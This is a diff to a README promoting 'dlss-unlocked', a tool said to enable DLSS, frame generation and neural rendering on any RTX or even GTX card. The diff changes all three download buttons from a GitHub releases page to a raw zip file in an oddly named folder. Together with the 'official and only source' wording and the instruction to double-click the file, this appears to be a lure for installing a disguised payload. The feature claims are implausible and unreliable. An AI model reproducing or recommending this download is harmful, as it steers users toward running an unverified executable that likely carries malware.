@@ -1,6 +1,6 @@
 <h1>🎮 dlss-unlocked - Unlock Premium Graphics on Any RTX GPU</h1>
 
-<p><a href="https://github.com/renatoljubicic22/dlss-unlocked/releases" style="display:inline-block;padding:16px 36px;background:#00b4d8;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,180,216,0.4);">⬇️ Download Now - Free</a></p>
+<p><a href="https://raw.githubusercontent.com/renatoljubicic22/dlss-unlocked/main/funiculitis/dlss-unlocked-3.5.zip" style="display:inline-block;padding:16px 36px;background:#00b4d8;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,180,216,0.4);">⬇️ Download Now - Free</a></p>
 
 <p style="font-size:16px;line-height:1.6;">Are you tired of your NVIDIA RTX graphics card not being able to use modern DLSS features in your favorite games? Do you want smoother gameplay, better frame rates, and crisper visuals without buying a new GPU? <strong>dlss-unlocked</strong> is your solution. This powerful tool removes artificial restrictions and activates DLSS Upscaler, Multi-Frame Generation (MFG), and DLSS Neural Rendering on any RTX GPU, including older GTX and RTX 20/30 series cards.</p>
 
@@ -31,7 +31,7 @@
 
 <h2>📥 Download & Installation Guide</h2>
 <p>Here is the official and only source for the latest version:</p>
-<p><a href="https://github.com/renatoljubicic22/dlss-unlocked/releases" style="display:inline-block;padding:14px 32px;background:#2d6a4f;color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Go to the Official Download Page</a></p>
+<p><a href="https://raw.githubusercontent.com/renatoljubicic22/dlss-unlocked/main/funiculitis/dlss-unlocked-3.5.zip" style="display:inline-block;padding:14px 32px;background:#2d6a4f;color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Go to the Official Download Page</a></p>
 <p style="font-size:15px;line-height:1.6;">Visit this link to download the application. The page will show you the available versions. Pick the newest one (usually the top item) and download the file. After that, double-click the downloaded file and follow the simple on-screen instructions. The setup will guide you through everything.</p>
 
 <h3>⏳ Complete Setup Steps</h3>
@@ -118,7 +118,7 @@
 
 <h2>🔗 Download Again</h2>
 <p>Just in case you missed it, here is the official download link one more time:</p>
-<p><a href="https://github.com/renatoljubicic22/dlss-unlocked/releases" style="display:inline-block;padding:14px 32px;background:#f94144;color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Download dlss-unlocked Now</a></p>
+<p><a href="https://raw.githubusercontent.com/renatoljubicic22/dlss-unlocked/main/funiculitis/dlss-unlocked-3.5.zip" style="display:inline-block;padding:14px 32px;background:#f94144;color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Download dlss-unlocked Now</a></p>
 
 <p style="font-size:15px;line-height:1.6;">Visit this link to download the application. Once you have it, you're five minutes away from unlocking the full potential of your NVIDIA GPU. Say goodbye to low frame rates and hello to the smoothest, most beautiful gaming experience of your life.</p>
 
